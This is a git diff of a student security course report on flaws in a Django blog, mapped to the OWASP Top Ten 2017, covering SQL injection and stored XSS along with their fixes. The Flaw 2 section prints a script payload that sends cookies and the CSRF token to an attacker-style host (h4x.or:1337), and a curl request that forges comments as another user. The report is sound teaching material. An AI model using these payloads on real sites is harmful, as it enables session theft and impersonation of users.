@@ -1,15 +1,16 @@
 #+author: Juho Hautala
-#+title: Project I Report - Security flaws from OWASP top 10 list
+#+title: Project I Report - Security flaws from OWASP Top Ten list
 
-* Security flaws from OWASP top 10 list
+* Security flaws from OWASP Top Ten 2017
+
+This essay uses the OWASP Top Ten 2017 list: https://owasp.org/www-project-top-ten/2017.
 
 LINK: https://github.com/vastus/cybsec21-project1
 
 FLAW 1:
-https://github.com/vastus/cybsec21-project1/blob/master/project1/blog/views.py#L31
 https://github.com/vastus/cybsec21-project1/blob/609cd90364be41e2b3df20bd72335be239bb46ae/project1/blog/views.py#L29
 
-** Flaw 1: A03:2021 – Injection
+** Flaw 1: A1:2017-Injection
 
 The first flaw shows a SQL injection vulnerability.
 
@@ -29,16 +30,48 @@ The flaw can be triggered for example in the following way:
 This will query the user table for the application and expose all the email addresses for each registered account. Changing the column name to any other column in the user table will expose its values. The SQL injection described in this flaw doesn't allow the execution of multiple statements but this vulnerability is a serious weakness since it can be used to expose all the data stored in the database.
 
 See https://owasp.org/Top10/A03_2021-Injection/ for more
+https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html
 
-** Flaw 1: Fixing it
+** Flaw 1: Fixing the SQL injection
 
 Instead of using raw SQL to perform the search one should use an ORM or escape the input used for the searching. Since this app is made with Django, the ORM should be used.
 
 The fix can be seen in the following commit: https://github.com/vastus/cybsec21-project1/blob/7355ba0c02171a1833733d8dfd6e1706be61d637/project1/blog/views.py#L25.
 
 FLAW 2:
-exact source link pinpointing flaw 2...
-description of flaw 2...
-how to fix it...
+https://github.com/vastus/cybsec21-project1/blob/0d6dd7cf68128481a71d8fe1c617648ea5e75d03/project1/blog/templates/blog/posts/show.html#L68
 
+** Flaw 2: A7:2017-Cross-Site Scripting (XSS)
 
+The blog allows registered users to comment on posts. The comment form includes a hidden input field that's named `current_user_id` which the application uses to figure out who's the commenter. An attacker could alter the value of this field to impose commenting as someone else.
+
+It's possible to inject <script> tags to the comment since the developers of the blog wanted to allow users to input their own markdown or styles to the comments but without further inspection this of course allows XSS attacks as well.
+
+An attack might occur when after the attacker has registered and logged in to the site and they visit a post and comment on the post with the following comment body:
+
+```
+Interesting read...
+
+<script>
+const csrfmiddlewaretoken = document.querySelector('input[name=csrfmiddlewaretoken]').value;
+const data = {cookie: document.cookie, csrfmiddlewaretoken};
+fetch('https://h4x.or:1337/csrf-tokens', {method: 'POST', body: JSON.stringify({data})});
+</script>
+```
+
+Given that the attacker has set up the server where the POST request is sending the CSRF token they can then use the token and another user ID to comment on posts as someone else.
+
+An example request to exploit the vulnerability:
+
+```
+curl 'http://blog/posts/1/comments' \
+     -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
+     -H 'Cookie: csrftoken=$CSRF_TOKEN_FROM_COOKIE_PAYLOAD' \
+     --data-raw 'csrfmiddlewaretoken=$CSRF_MIDDLEWARE_TOKEN_FROM_PAYLOAD&comment_user_id=1&comment_body=holup'
+```
+
+** Flaw 2: Fixing the XSS weakness
+
+First of all the application should figure out the current user from the session instead of getting it from the hidden input field. All user input should be considered unsafe. The way that the comment body is rendered needs to be changed from safe to unsafe, so that the browser doesn't interpret the HTML tags (e.g. <script>).
+
+The fix can be seen in the following commit: https://github.com/vastus/cybsec21-project1/commit/c2e0b18a1357461d6224466c1196e1a4ad9e8438
